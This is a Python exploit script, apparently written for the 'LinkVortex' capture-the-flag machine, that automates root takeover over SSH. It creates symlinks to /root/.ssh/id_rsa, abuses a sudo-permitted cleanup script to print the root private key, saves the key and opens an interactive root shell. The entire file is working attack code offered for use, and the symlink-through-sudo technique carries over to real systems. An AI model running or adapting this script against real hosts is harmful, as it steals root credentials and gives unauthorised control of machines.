import argparse
import paramiko
import time
import re
import sys, signal

def contr_c(sig, frame):
	print(f"\n[!] Exiting the program...")
	sys.exit(1)

signal.signal(signal.SIGINT, contr_c)


def create_symlinks(ssh):
    cmds = [
        "ln -s /root/.ssh/id_rsa id_rsa.txt",
        "ln -s /home/bob/id_rsa.txt id_rsa.png"
    ]
    for cmd in cmds:
        stdin, stdout, stderr = ssh.exec_command(cmd)
        stdout.channel.recv_exit_status()


def extract_id_rsa(ssh, script_path):
    cmd = f"sudo CHECK_CONTENT=true /usr/bin/bash {script_path} id_rsa.png"
    stdin, stdout, stderr = ssh.exec_command(cmd)
    output = stdout.read().decode()
    match = re.search(r"-----BEGIN OPENSSH PRIVATE KEY-----(.*?)-----END OPENSSH PRIVATE KEY-----", output, re.DOTALL)
    if match:
        private_key = "-----BEGIN OPENSSH PRIVATE KEY-----" + match.group(1) + "-----END OPENSSH PRIVATE KEY-----"
        return private_key.strip()
    else:
        print("[!] Could not extract private key.")
        return None


def save_private_key(private_key, filename="id_rsa_root"):
    with open(filename, "w") as f:
        f.write(private_key)
    import os
    os.chmod(filename, 0o600)
    print(f"[+] Private key saved to {filename}")


def root_shell(ip, key_path):
    key = paramiko.RSAKey.from_private_key_file(key_path)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip, username="root", pkey=key)

    chan = ssh.invoke_shell()
    print("[+] Root shell established. Type commands below.\n")
    try:
        while True:
            cmd = input("root@linkvortex:~# ")
            if cmd.strip() == "exit":
                break
            chan.send(cmd + "\n")
            time.sleep(0.5)
            while chan.recv_ready():
                print(chan.recv(4096).decode(), end="")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    finally:
        ssh.close()


def main():
    parser = argparse.ArgumentParser(description="AutoPWN root via symlink abuse on LinkVortex")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--user", required=True, help="SSH username (bob)")
    parser.add_argument("--password", required=True, help="SSH password")
    parser.add_argument("--script-path", default="/opt/ghost/clean_symlink.sh", help="Path to clean_symlink.sh")
    parser.add_argument("--key-out", default="id_rsa_root", help="Where to save extracted private key")

    args = parser.parse_args()

    print(f"[+] Connecting to {args.user}@{args.target}...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(args.target, username=args.user, password=args.password)

    print("[+] Creating symlinks...")
    create_symlinks(ssh)

    print("[+] Executing vulnerable script to dump root key...")
    private_key = extract_id_rsa(ssh, args.script_path)
    if not private_key:
        ssh.close()
        return

    save_private_key(private_key, args.key_out)
    ssh.close()

    print("[+] Connecting to root with extracted private key...\n")
    root_shell(args.target, args.key_out)


if __name__ == "__main__":
    main()
